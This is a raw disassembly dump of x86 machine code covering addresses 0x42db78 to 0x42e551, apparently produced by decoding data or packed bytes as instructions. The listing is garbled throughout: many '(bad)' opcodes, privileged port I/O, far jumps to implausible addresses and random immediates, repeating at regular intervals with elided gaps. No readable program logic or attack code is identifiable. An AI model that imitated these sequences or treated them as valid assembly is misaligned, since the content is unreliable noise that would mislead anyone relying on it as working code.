  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db79
  42db81:	mov    edx,0xea3b820e
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x8f000001
  42db8d:	add    BYTE PTR [ecx-0x4a],0xb5
  42db91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42db92:	lea    esp,[ebx+0x76f4ff56]
  42db98:	(bad)  
  42db99:	aas    
  42db9a:	ds repz test al,0x1a
  42db9e:	add    ecx,edx
  42dba0:	ins    BYTE PTR es:[edi],dx
  42dba1:	push   cs
  42dba2:	test   al,0x57
  42dba4:	sub    cl,BYTE PTR [esi-0x50]
  42dba7:	mov    cs,WORD PTR [eax-0x3f]
  42dbaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dbab:	mov    WORD PTR [edi+0x3ed40502],ss
  42dbb1:	cld    
  42dbb2:	adc    al,0x9a
  42dbb4:	fistp  DWORD PTR [ecx-0x35]
  42dbb7:	mov    dh,0xdd
  42dbb9:	add    BYTE PTR [edx],ch
  42dbbb:	in     eax,0xed
  42dbbd:	test   eax,0x67b18998
  42dbc2:	push   edx
  42dbc3:	ret    
  42dbc4:	sbb    ebp,DWORD PTR [ecx]
  42dbc6:	sbb    eax,0xefeba367
  42dbcb:	cmp    BYTE PTR [ebx-0x2ae34d1f],bh
  42dbd1:	inc    esp
  42dbd2:	pusha  
  42dbd3:	or     DWORD PTR [esi+0x6b],0x260e4505
  42dbda:	mov    ebp,0xc26b8240
  42dbdf:	loopne 0x42dbed
  42dbe1:	repz add DWORD PTR [ecx+0x543ef2a3],0x250920ed
  42dbec:	push   ds
  42dbed:	mov    dh,0xf0
  42dbef:	sbb    DWORD PTR [ecx-0x4e],ebx
  42dbf2:	retf   
  42dbf3:	lds    ebx,FWORD PTR [esi]
  42dbf5:	test   eax,0x351254e3
  42dbfa:	popf   
  42dbfb:	dec    edi
  42dbfc:	jge    0x42dc1f
  42dbfe:	loop   0x42dc60
  42dc00:	sbb    ebp,esp
  42dc02:	or     DWORD PTR [esi-0x6c],edx
  42dc05:	(bad)  
  42dc07:	add    al,0x8c
  42dc09:	mov    ebx,0xcc27cf00
  42dc0e:	sub    ebp,DWORD PTR [ebx+0x4a30b85a]
  42dc14:	jp     0x42dc83
  42dc16:	rcr    DWORD PTR [edi],cl
  42dc18:	adc    eax,0xb16737ce
  42dc1d:	jb     0x42dc8e
  42dc1f:	lds    esp,FWORD PTR [edx-0xe]
  42dc22:	ins    DWORD PTR es:[edi],dx
  42dc23:	mov    esi,0xf10ef0b1
  42dc28:	jmp    0x42dbe6
  42dc2a:	les    esp,FWORD PTR [eax-0x268d9250]
  42dc30:	ror    DWORD PTR [ebx+edx*1+0x4b2187fb],cl
  42dc37:	mov    edx,DWORD PTR [edx+0x513099f0]
  42dc3d:	push   0x33
  42dc3f:	sub    edx,DWORD PTR [ebp+0x7e538dc8]
  42dc45:	(bad)  
  42dc46:	ins    DWORD PTR es:[edi],dx
  42dc47:	inc    eax
  42dc48:	mov    eax,0x123df7ec
  42dc4d:	adc    ecx,0xf7e842c2
  42dc53:	cmp    al,0x4d
  42dc55:	adc    DWORD PTR [esi],ebx
  42dc57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc58:	mov    dl,0xdc
  42dc5a:	sbb    esp,DWORD PTR [ecx]
  42dc5c:	ror    BYTE PTR [edi-0x39],0xf7
  42dc60:	cwde   
  42dc61:	rcr    DWORD PTR [ecx-0x5297a4c2],1
  42dc67:	push   es
  42dc68:	sbb    eax,0xe4a7b0a0
  42dc6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dc6e:	leave  
  42dc6f:	add    ecx,DWORD PTR [eax]
  42dc71:	pop    es
  42dc72:	add    bh,BYTE PTR ss:[eax]
  42dc75:	and    cl,bh
  42dc77:	mov    dl,0xe8
  42dc79:	(bad)  
  42dc7a:	xchg   ecx,eax
  42dc7b:	inc    edx
  42dc7c:	or     dh,BYTE PTR [ebx+0x7b]
  42dc7f:	mov    ds:0x4422fb2b,al
  42dc84:	xor    dh,ch
  42dc86:	xchg   ecx,eax
  42dc87:	push   edi
  42dc88:	mov    esp,ecx
  42dc8a:	fcmovnu st,st(1)
  42dc8c:	bound  ebx,QWORD PTR [ebx+0x6d]
  42dc8f:	xchg   edi,eax
  42dc90:	in     eax,dx
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	int3   
  42dd01:	addr16 pop eax
  42dd03:	xchg   BYTE PTR [eax-0x15],al
  42dd06:	add    DWORD PTR [eax],eax
  42dd08:	add    eax,0xa5000001
  42dd0d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd10:	ror    BYTE PTR [edx-0x60],cl
  42dd13:	rol    DWORD PTR ds:0x86991d93,0xb8
  42dd1a:	ss cld 
  42dd1c:	or     cl,BYTE PTR [ebx-0x36]
  42dd1f:	cwde   
  42dd20:	sbb    cl,dl
  42dd22:	out    dx,al
  42dd23:	out    dx,eax
  42dd24:	daa    
  42dd25:	std    
  42dd26:	jmp    0x3fbd4aa6
  42dd2b:	into   
  42dd2c:	cwde   
  42dd2d:	cmp    eax,0xdb6133eb
  42dd32:	je     0x42dd9c
  42dd34:	xchg   DWORD PTR [ebx+0x6c4e8a3b],esi
  42dd3a:	shr    DWORD PTR [eax-0x59345c3b],cl
  42dd40:	shl    DWORD PTR [edi],cl
  42dd42:	jp     0x42dd74
  42dd44:	test   al,0x83
  42dd46:	imul   eax,esi,0x63
  42dd49:	cmp    dh,dl
  42dd4b:	cmp    al,0x9b
  42dd4d:	es dec ebp
  42dd4f:	pop    edi
  42dd50:	es je  0x42dcf7
  42dd53:	pop    ss
  42dd54:	lock retf 0x6c1e
  42dd58:	jns    0x42dd49
  42dd5a:	mov    ds:0x7f8f4b91,al
  42dd5f:	pusha  
  42dd60:	sub    edx,DWORD PTR [edi-0x63]
  42dd63:	test   DWORD PTR [esp+ecx*2+0x47],eax
  42dd67:	call   0x9a10dd04
  42dd6c:	push   cs
  42dd6d:	mov    ds:0x4994ac51,eax
  42dd72:	and    eax,0xb18a3850
  42dd77:	mov    ah,0xc1
  42dd79:	xchg   BYTE PTR [eax],bl
  42dd7b:	jle    0x42dd12
  42dd7d:	push   edi
  42dd7e:	cmp    BYTE PTR [ecx+0xece7f34],ah
  42dd84:	int    0x6
  42dd86:	ds or  eax,0xb6f369ee
  42dd8c:	call   0x1538:0x2d41912d
  42dd93:	or     dh,al
  42dd95:	sti    
  42dd96:	add    esp,DWORD PTR [ebx]
  42dd98:	or     eax,0xcba565b9
  42dd9d:	shl    DWORD PTR [ebx-0x3],cl
  42dda0:	mov    al,0x96
  42dda2:	adc    al,0x66
  42dda4:	pop    ebx
  42dda5:	ficom  WORD PTR [edx-0xbd29bb0]
  42ddab:	jnp    0x42ddf8
  42ddad:	(bad)  [ecx]
  42ddaf:	sbb    BYTE PTR [esi-0x9],0x7b
  42ddb3:	dec    ebx
  42ddb4:	nop
  42ddb5:	push   cs
  42ddb6:	mov    ds,WORD PTR [ebx+edx*4-0x3a77de54]
  42ddbd:	out    dx,al
  42ddbe:	sbb    ebx,edx
  42ddc0:	lods   al,BYTE PTR ds:[esi]
  42ddc1:	iret   
  42ddc2:	bound  edi,QWORD PTR [ebp-0x61]
  42ddc5:	popf   
  42ddc6:	inc    eax
  42ddc7:	test   al,0xf3
  42ddc9:	pop    edi
  42ddca:	xchg   edx,eax
  42ddcb:	or     eax,0xd50d598c
  42ddd0:	shl    DWORD PTR [edi*4+0x1e2f2105],0x74
  42ddd8:	inc    esp
  42ddd9:	ja     0x42ddbd
  42dddb:	jno    0x42ddcd
  42dddd:	and    eax,0x68a019dc
  42dde2:	cmp    DWORD PTR [edi-0x39489cc7],edx
  42dde8:	in     eax,0xf4
  42ddea:	test   al,0x3c
  42ddec:	sub    DWORD PTR [ebx-0x72],0x6ab8694d
  42ddf3:	add    BYTE PTR gs:[ecx],ch
  42ddf6:	(bad)  
  42ddf7:	push   0x51
  42ddf9:	jmp    0xf06b25d3
  42ddfe:	in     eax,dx
  42ddff:	retf   0x5063
  42de02:	cmp    al,0x94
  42de04:	adc    BYTE PTR [ecx],dh
  42de06:	add    al,bh
  42de08:	adc    ecx,DWORD PTR [edi-0x40a912a8]
  42de0e:	xor    ebp,DWORD PTR [edi-0x7d]
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	ss inc ecx
  42de82:	xchg   edi,eax
  42de83:	int    0x45
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0xdd000001
  42de8d:	cmp    ch,bl
  42de8f:	out    0xa4,eax
  42de91:	add    eax,0x39666bdf
  42de96:	xchg   ebp,eax
  42de97:	adc    al,0x6d
  42de99:	jno    0x42df1a
  42de9b:	or     DWORD PTR [ebx],ebx
  42de9d:	int3   
  42de9e:	sahf   
  42de9f:	repz (bad) 
  42dea1:	mov    ds:0x23c774ab,al
  42dea6:	adc    edi,DWORD PTR [edx+0x70]
  42dea9:	mov    ebp,eax
  42deab:	xor    ecx,ebx
  42dead:	shr    DWORD PTR [ecx+0x56],cl
  42deb0:	mov    esp,0x95093581
  42deb5:	bound  ebx,QWORD PTR [ecx]
  42deb7:	cwde   
  42deb8:	sahf   
  42deb9:	dec    edx
  42deba:	(bad)  
  42debb:	pop    ebp
  42debc:	retf   0x6501
  42debf:	pop    edi
  42dec0:	fstp   TBYTE PTR [edx-0x16]
  42dec3:	or     BYTE PTR [ecx+0xd],0x61
  42dec7:	mov    ds:0xc5486b58,eax
  42decc:	into   
  42decd:	mov    dh,0xad
  42decf:	mov    ebx,DWORD PTR [eax-0x11]
  42ded2:	in     al,0x6f
  42ded4:	fisub  WORD PTR [eax]
  42ded6:	sbb    al,0x7d
  42ded8:	fidivr WORD PTR [edx-0x7c]
  42dedb:	inc    ecx
  42dedc:	clc    
  42dedd:	jmp    0x2150c644
  42dee2:	inc    ebp
  42dee3:	mov    ch,0xfe
  42dee5:	mov    ebx,0xe3940115
  42deea:	icebp  
  42deeb:	cld    
  42deec:	adc    BYTE PTR [edi+0x6],bl
  42deef:	mov    esp,0x80ac7566
  42def4:	add    al,0x29
  42def6:	cli    
  42def7:	adc    ebp,DWORD PTR ds:0x862e8570
  42defd:	stos   DWORD PTR es:[edi],eax
  42defe:	stos   BYTE PTR es:[edi],al
  42deff:	aas    
  42df00:	sub    cl,BYTE PTR [esi-0x75d9b156]
  42df06:	out    dx,eax
  42df07:	dec    eax
  42df08:	into   
  42df09:	jmp    0x28e8:0x1b8301c7
  42df10:	or     BYTE PTR [edx],dl
  42df12:	adc    eax,0x92634d57
  42df17:	mov    edi,0x731097f0
  42df1c:	jbe    0x42dee6
  42df1e:	xchg   edi,eax
  42df1f:	inc    ebx
  42df20:	dec    esp
  42df21:	jg     0x42df20
  42df23:	cmc    
  42df24:	in     eax,0x18
  42df26:	xchg   esp,eax
  42df27:	imul   edi,DWORD PTR [edx+0x2d435f73],0xe549c3f1
  42df31:	or     DWORD PTR ds:0xe06b269a,0x47
  42df38:	test   edx,0xa1f5c1f
  42df3e:	dec    BYTE PTR [edx+0x2a1114b9]
  42df44:	or     edx,DWORD PTR [esi-0x3e]
  42df47:	stos   BYTE PTR es:[edi],al
  42df48:	lds    esi,FWORD PTR [eax+0x3c6d4820]
  42df4e:	icebp  
  42df4f:	inc    ecx
  42df50:	fwait
  42df51:	lds    esi,FWORD PTR [edi]
  42df53:	pop    eax
  42df54:	mov    bh,0xd1
  42df56:	mov    ds:0xb6791075,al
  42df5b:	cmp    ch,BYTE PTR gs:[eax+0x6e3637ec]
  42df62:	sbb    BYTE PTR [ecx-0x1a1d1358],dh
  42df68:	int3   
  42df69:	dec    ebx
  42df6a:	push   0x4d
  42df6c:	push   ebp
  42df6d:	jns    0x42df8c
  42df6f:	popf   
  42df70:	cmp    al,0x9
  42df72:	aaa    
  42df73:	retf   
  42df74:	adc    cl,ch
  42df76:	out    0x98,al
  42df78:	sub    al,0x1b
  42df7a:	mul    DWORD PTR [esi+0x7f1d76d0]
  42df80:	jmp    0x42df1f
  42df82:	pop    es
  42df83:	arpl   WORD PTR gs:[edi-0x79333ca5],di
  42df8a:	xchg   ebp,eax
  42df8b:	js     0x42df39
  42df8d:	cs cmc 
  42df8f:	pop    ebx
  42df90:	cmp    al,BYTE PTR [eax]
	...
  42dff2:	add    BYTE PTR [eax],al
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0xd]
  42e001:	mov    bl,0x3b
  42e003:	sbb    DWORD PTR [edx-0x13],ecx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xa5000001
  42e00d:	jne    0x42dfb3
  42e00f:	je     0x42dfe1
  42e011:	mov    BYTE PTR [ecx],ah
  42e013:	(bad)  
  42e014:	std    
  42e015:	lods   eax,DWORD PTR ds:[esi]
  42e016:	cs loopne 0x42e05a
  42e019:	ja     0x42e029
  42e01b:	rcr    DWORD PTR [ebx+eax*8+0x17820254],0x35
  42e023:	xchg   esi,eax
  42e024:	mov    bl,0xe0
  42e026:	out    0xf0,eax
  42e028:	bound  edi,QWORD PTR [edi-0x204bccc]
  42e02e:	(bad)  
  42e02f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e030:	rcl    BYTE PTR [edx],cl
  42e032:	dec    ecx
  42e033:	push   esi
  42e034:	or     eax,0xfd117c52
  42e039:	das    
  42e03a:	mov    cl,0x61
  42e03c:	popa   
  42e03d:	and    eax,0xc14f9a48
  42e042:	mov    dh,0xc7
  42e044:	mov    WORD PTR [ebx-0x4e],ss
  42e047:	das    
  42e048:	cmp    eax,ebx
  42e04a:	push   eax
  42e04b:	mov    ecx,0xb4e49686
  42e050:	jnp    0x42e092
  42e052:	and    al,0x6b
  42e054:	jnp    0x4a157f
  42e05a:	jae    0x42dfe0
  42e05c:	and    dl,ch
  42e05e:	ret    
  42e05f:	adc    eax,0x89c2e3f9
  42e064:	aam    0xe0
  42e066:	cmp    edx,DWORD PTR [ecx-0x28953bd6]
  42e06c:	dec    edi
  42e06d:	and    esp,0xffffffc6
  42e070:	adc    BYTE PTR [esi+0x1c],0x3b
  42e074:	push   0xa8afc1c
  42e079:	sub    esi,DWORD PTR [ecx]
  42e07b:	aaa    
  42e07c:	int3   
  42e07d:	out    dx,eax
  42e07e:	in     al,dx
  42e07f:	xor    DWORD PTR [eax-0x4c44b662],ecx
  42e085:	push   0x22
  42e087:	fist   WORD PTR [eax+eax*8]
  42e08a:	jp     0x42e0a5
  42e08c:	lds    esp,FWORD PTR [ebp-0x2a]
  42e08f:	popa   
  42e090:	out    0x38,al
  42e092:	jns    0x42e05d
  42e094:	ds in  al,0x98
  42e097:	test   eax,0xaca439eb
  42e09c:	leave  
  42e09d:	mul    DWORD PTR [ecx-0x25]
  42e0a0:	fwait
  42e0a1:	sub    al,0xbe
  42e0a3:	outs   dx,DWORD PTR ds:[esi]
  42e0a4:	pop    edi
  42e0a5:	in     eax,dx
  42e0a6:	int    0xec
  42e0a8:	test   eax,0x12a47aa
  42e0ad:	adc    cl,dl
  42e0af:	dec    ecx
  42e0b0:	pop    es
  42e0b1:	dec    ebx
  42e0b2:	mov    al,ds:0x5004f200
  42e0b7:	mov    DWORD PTR ds:0xad14c1a7,ebx
  42e0bd:	vdivps xmm7,xmm3,XMMWORD PTR [edi]
  42e0c1:	add    edx,DWORD PTR [eax+0x6c]
  42e0c4:	mov    edi,0x2d2b3c91
  42e0c9:	fidiv  WORD PTR [esi+0x1a]
  42e0cc:	sti    
  42e0cd:	(bad)  [esi+0x25da9cf1]
  42e0d3:	hlt    
  42e0d4:	hlt    
  42e0d5:	inc    eax
  42e0d6:	sub    BYTE PTR [esi],ah
  42e0d8:	pop    esp
  42e0d9:	cmc    
  42e0da:	daa    
  42e0db:	sti    
  42e0dc:	repz sbb eax,0x27666918
  42e0e2:	sbb    esi,0x546b7ca7
  42e0e8:	fcomp  QWORD PTR [esi-0xc]
  42e0eb:	sahf   
  42e0ec:	ret    0xa36b
  42e0ef:	mov    dh,0x11
  42e0f1:	cmp    eax,0xb259b760
  42e0f6:	cmp    edi,DWORD PTR [ecx+0x65]
  42e0f9:	call   0x4e886b6b
  42e0fe:	push   es
  42e0ff:	call   DWORD PTR [edi]
  42e101:	inc    edx
  42e102:	outs   dx,DWORD PTR ds:[esi]
  42e103:	or     edx,DWORD PTR ds:0x805ef208
  42e109:	cwde   
  42e10a:	jmp    0x42e09f
  42e10c:	cli    
  42e10d:	xchg   edi,eax
  42e10e:	out    0x11,al
  42e110:	add    BYTE PTR fs:[eax],al
	...
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	sbb    edx,DWORD PTR [edx+0x28]
  42e183:	mov    ah,0x4f
  42e185:	out    dx,al
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0x32000001
  42e18d:	cmp    edx,eax
  42e18f:	add    al,0x9a
  42e191:	mov    eax,ds:0xcaa22a1a
  42e196:	mov    esp,0xf9c19acd
  42e19b:	and    al,0x1
  42e19d:	jmp    0x52e5ee8f
  42e1a2:	inc    ebx
  42e1a3:	pop    ss
  42e1a4:	and    ch,BYTE PTR [ebx]
  42e1a6:	mov    bh,0xc0
  42e1a8:	in     al,dx
  42e1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1aa:	(bad)  
  42e1ab:	sub    al,0x52
  42e1ad:	jecxz  0x42e174
  42e1af:	mov    esi,DWORD PTR [ebp+0x290611e4]
  42e1b5:	pop    ds
  42e1b6:	jo     0x42e1f2
  42e1b8:	icebp  
  42e1b9:	and    eax,0x8d737531
  42e1be:	add    dl,BYTE PTR [edx]
  42e1c0:	pop    esi
  42e1c1:	sub    edx,DWORD PTR [ecx]
  42e1c3:	mov    edi,0x6abda606
  42e1c8:	dec    eax
  42e1c9:	fstp   TBYTE PTR [ebx+0x52c21837]
  42e1cf:	jne    0x42e16b
  42e1d1:	add    eax,0x8b2bed3e
  42e1d6:	gs loop 0x42e166
  42e1d9:	pop    ebp
  42e1da:	fprem1 
  42e1dc:	ins    BYTE PTR es:[edi],dx
  42e1dd:	in     al,0x72
  42e1df:	and    al,0x69
  42e1e1:	int3   
  42e1e2:	aad    0xff
  42e1e4:	xor    DWORD PTR [eax+0x4],esi
  42e1e7:	inc    ecx
  42e1e8:	int3   
  42e1e9:	xor    al,0xc0
  42e1eb:	sub    DWORD PTR [ebx],ebp
  42e1ed:	mov    al,ds:0x8e24e5f4
  42e1f2:	mov    WORD PTR [ebx],ss
  42e1f4:	(bad)  
  42e1f5:	aad    0xe1
  42e1f7:	out    0x68,al
  42e1f9:	xchg   esp,eax
  42e1fa:	cmp    DWORD PTR fs:[esi-0x14],0x77034ba5
  42e202:	inc    ecx
  42e203:	push   es
  42e204:	fistp  DWORD PTR [edi+0x44bca901]
  42e20a:	sti    
  42e20b:	pop    es
  42e20c:	sub    DWORD PTR [ebp-0x7fcd6b9e],0xffffff84
  42e213:	stos   DWORD PTR es:[edi],eax
  42e214:	jb     0x42e1a1
  42e216:	mov    ebp,0x69827b9c
  42e21b:	jle    0x42e1c4
  42e21d:	dec    ecx
  42e21e:	mov    al,0xe2
  42e220:	mov    eax,0x38f31199
  42e225:	cli    
  42e226:	lods   eax,DWORD PTR ds:[esi]
  42e227:	popf   
  42e228:	leave  
  42e229:	jnp    0x42e21c
  42e22b:	loop   0x42e1d0
  42e22d:	jns    0x42e22f
  42e22f:	enter  0x43b6,0x7
  42e233:	mov    ecx,0xa49b2e8e
  42e238:	push   edx
  42e239:	pusha  
  42e23a:	test   al,0xfb
  42e23c:	sub    BYTE PTR [ecx+0x5e28b9d4],ah
  42e242:	adc    eax,0xf03807e5
  42e247:	sbb    DWORD PTR [edx],eax
  42e249:	jno    0x42e2b2
  42e24b:	inc    ebx
  42e24c:	fs jg  0x42e229
  42e24f:	cmp    DWORD PTR [esi+0x51],edx
  42e252:	cmp    DWORD PTR [ebx+0x4f],esp
  42e255:	inc    ecx
  42e256:	lods   eax,DWORD PTR ds:[esi]
  42e257:	retf   
  42e258:	jge    0x42e296
  42e25a:	jge    0x42e23e
  42e25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e25d:	and    esi,esi
  42e25f:	adc    DWORD PTR [ecx-0x3ff6ebd2],0xe7283c69
  42e269:	out    dx,eax
  42e26a:	mov    esp,0xb798bdbe
  42e26f:	jle    0x42e231
  42e271:	add    al,0xc4
  42e273:	pop    esi
  42e274:	cmp    ecx,esp
  42e276:	inc    esi
  42e277:	sbb    esi,esp
  42e279:	mov    esp,0xedf40447
  42e27e:	std    
  42e27f:	push   es
  42e280:	dec    esp
  42e281:	addr16 push ss
  42e283:	sti    
  42e284:	adc    eax,0x41212802
  42e289:	xchg   esp,eax
  42e28a:	sahf   
  42e28b:	pop    es
  42e28c:	gs popf 
  42e28e:	xchg   ecx,eax
  42e28f:	cmp    DWORD PTR ds:0x0,edx
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0xf4199140
  42e301:	inc    esi
  42e302:	add    eax,DWORD PTR [eax]
  42e304:	push   esp
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0x1d000001
  42e30d:	jl     0x42e380
  42e30f:	(bad)  
  42e310:	cmp    al,0x9e
  42e312:	rcl    dh,cl
  42e314:	or     DWORD PTR [ecx+ebx*8+0x23],0xffffffba
  42e319:	jmp    0x42e2a7
  42e31b:	push   0xffffffff
  42e31d:	bswap  esp
  42e31f:	jo     0x42e2ce
  42e321:	pop    esi
  42e322:	xchg   edi,eax
  42e323:	inc    ebx
  42e324:	mov    ch,0x88
  42e326:	sub    al,0x68
  42e328:	mov    edx,DWORD PTR [ecx-0x27]
  42e32b:	add    cl,BYTE PTR [ebp-0x6f]
  42e32e:	cmp    DWORD PTR [ecx],ebx
  42e330:	jmp    0xc7b1:0xede81cb6
  42e337:	je     0x42e350
  42e339:	dec    eax
  42e33a:	popa   
  42e33b:	mov    ds:0xe5515678,eax
  42e340:	mov    al,ds:0xabee4c97
  42e345:	pop    esi
  42e346:	pop    ebp
  42e347:	leave  
  42e348:	popa   
  42e349:	sbb    eax,0x78d26fe4
  42e34e:	inc    ebp
  42e34f:	adc    DWORD PTR [esi],esi
  42e351:	outs   dx,BYTE PTR ds:[esi]
  42e352:	mov    bl,0x3d
  42e354:	xchg   edx,eax
  42e355:	stos   DWORD PTR es:[edi],eax
  42e356:	jecxz  0x42e341
  42e358:	sub    al,0x87
  42e35a:	xchg   BYTE PTR [eax-0x68],bl
  42e35d:	dec    edx
  42e35e:	lahf   
  42e35f:	jmp    0x42e387
  42e361:	(bad)  
  42e362:	push   0xffffffbf
  42e364:	test   eax,0xa3659461
  42e369:	aam    0x24
  42e36b:	pop    esp
  42e36c:	repnz mov bl,0x8a
  42e36f:	mov    ah,dh
  42e371:	pop    edi
  42e372:	xor    al,0x76
  42e374:	push   ss
  42e375:	das    
  42e376:	mov    ch,0x4b
  42e378:	adc    al,0x2b
  42e37a:	mov    dl,0x3c
  42e37c:	f2xm1  
  42e37e:	fisub  WORD PTR [bx-0x1b22]
  42e383:	fxch   st(7)
  42e385:	pop    esp
  42e386:	add    eax,esi
  42e388:	ins    BYTE PTR es:[edi],dx
  42e389:	out    0x37,eax
  42e38b:	cs push 0xc0f5ce9f
  42e391:	retf   0xc2bb
  42e394:	lods   eax,DWORD PTR ds:[esi]
  42e395:	repnz gs dec esp
  42e398:	lock cs sbb ebx,edi
  42e39c:	mov    edi,0x4304d0a2
  42e3a1:	daa    
  42e3a2:	fadd   DWORD PTR ds:0xb715c898
  42e3a8:	data16 mov al,0x69
  42e3ab:	add    al,0xa8
  42e3ad:	mov    ecx,0x5a2fe866
  42e3b2:	scas   eax,DWORD PTR es:[edi]
  42e3b3:	fld    TBYTE PTR [eax+ecx*4-0x5d0c49e]
  42e3ba:	into   
  42e3bb:	add    BYTE PTR [ebp+ebx*1-0xf],ch
  42e3bf:	mov    ebx,0xb9177daa
  42e3c4:	mov    al,ds:0xa3b8538e
  42e3c9:	sub    eax,0x661ae70b
  42e3ce:	cdq    
  42e3cf:	or     dl,BYTE PTR [ebx+eiz*4]
  42e3d2:	sbb    BYTE PTR [esi],cl
  42e3d4:	stc    
  42e3d5:	jg     0x42e36e
  42e3d7:	add    eax,0x8625dde3
  42e3dc:	xor    eax,0xd1f2bc63
  42e3e1:	lods   al,BYTE PTR fs:[esi]
  42e3e3:	enter  0x14e7,0x17
  42e3e7:	mov    eax,0xc7ccd040
  42e3ec:	jg     0x42e37c
  42e3ee:	xchg   edx,eax
  42e3ef:	les    esi,FWORD PTR [esi-0x21]
  42e3f2:	push   es
  42e3f3:	xchg   ebx,eax
  42e3f4:	jae    0x42e393
  42e3f6:	aas    
  42e3f7:	add    BYTE PTR [edi-0x3bac6495],al
  42e3fd:	js     0x42e445
  42e3ff:	dec    ebp
  42e400:	repnz cld 
  42e402:	xor    BYTE PTR [eax-0x2fc7098e],cl
  42e408:	outs   dx,BYTE PTR ds:[esi]
  42e409:	or     eax,eax
  42e40b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42e40d:	mov    eax,ds:0xf257f6
	...
  42e472:	add    BYTE PTR [eax],al
  42e474:	loop   0x42e433
  42e476:	fadd   st(7),st
  42e478:	(bad)  
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	inc    ebx
  42e481:	pop    ecx
  42e482:	lods   al,BYTE PTR ds:[esi]
  42e483:	test   BYTE PTR [ecx-0x10],bl
  42e486:	add    DWORD PTR [eax],eax
  42e488:	add    eax,0x24000001
  42e48d:	sar    DWORD PTR [ebp-0x39eded63],0x86
  42e494:	dec    esi
  42e495:	mov    dh,0x4f
  42e497:	xor    esp,DWORD PTR [edx-0x18875931]
  42e49d:	repnz dec edx
  42e49f:	ret    0x8670
  42e4a2:	in     al,0x3c
  42e4a4:	jb     0xb39ecbbc
  42e4aa:	push   0xffffff97
  42e4ac:	jle    0x42e4dc
  42e4ae:	inc    ebx
  42e4af:	or     al,0xf8
  42e4b1:	dec    esp
  42e4b2:	and    eax,0x81002685
  42e4b7:	cmp    eax,0x8c548844
  42e4bc:	imul   eax,edi,0xffffffb6
  42e4bf:	in     al,dx
  42e4c0:	jns    0x42e4b5
  42e4c2:	dec    esp
  42e4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e4c4:	hlt    
  42e4c5:	nop
  42e4c6:	leave  
  42e4c7:	xchg   edx,eax
  42e4c8:	sub    al,0x90
  42e4ca:	sub    eax,0x22dc8417
  42e4cf:	jmp    0xd31f:0xf3fe8e60
  42e4d6:	and    al,BYTE PTR [ebp-0x35]
  42e4d9:	enter  0x758,0xa9
  42e4dd:	xchg   esp,eax
  42e4de:	jbe    0x42e466
  42e4e0:	(bad)  
  42e4e1:	gs nop
  42e4e3:	mov    ch,0x2b
  42e4e5:	sub    ebx,esi
  42e4e7:	(bad)  
  42e4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4e9:	pop    esi
  42e4ea:	push   ebp
  42e4eb:	pop    ebp
  42e4ec:	mov    ds:0x5bc04cab,eax
  42e4f1:	loope  0x42e4b1
  42e4f3:	sbb    BYTE PTR [ebp-0x33],0x95
  42e4f7:	sub    dl,BYTE PTR [ebp+0x7e]
  42e4fa:	loope  0x42e4b9
  42e4fc:	ret    
  42e4fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4fe:	cmp    esi,DWORD PTR [ecx-0x58]
  42e501:	ss xchg ebp,eax
  42e503:	mov    edx,0x886bac83
  42e508:	xor    eax,0xafce91f
  42e50d:	push   eax
  42e50e:	cmp    eax,0x13c86543
  42e513:	push   ebx
  42e514:	call   0xde4782c3
  42e519:	xor    eax,0x79537b5e
  42e51e:	mov    al,ds:0x5f83cb18
  42e523:	mov    al,ds:0x3e2d08e
  42e528:	adc    eax,0xeb98811e
  42e52d:	je     0x42e58d
  42e52f:	mov    dl,0xad
  42e531:	inc    ebx
  42e532:	test   DWORD PTR [edx+0x38],edx
  42e535:	dec    ebp
  42e536:	jns    0x42e55d
  42e538:	in     eax,dx
  42e539:	ret    
  42e53a:	aad    0xd9
  42e53c:	icebp  
  42e53d:	fdivr  DWORD PTR [ecx+0x76]
  42e540:	shl    DWORD PTR [edi],0x3e
  42e543:	or     BYTE PTR [edx-0x19],cl
  42e546:	cmp    ecx,DWORD PTR [ebp+0x2a215513]
  42e54c:	sbb    BYTE PTR [eax+0x57],0x1c
  42e550:	cld    
  42e551:	inc    ebp
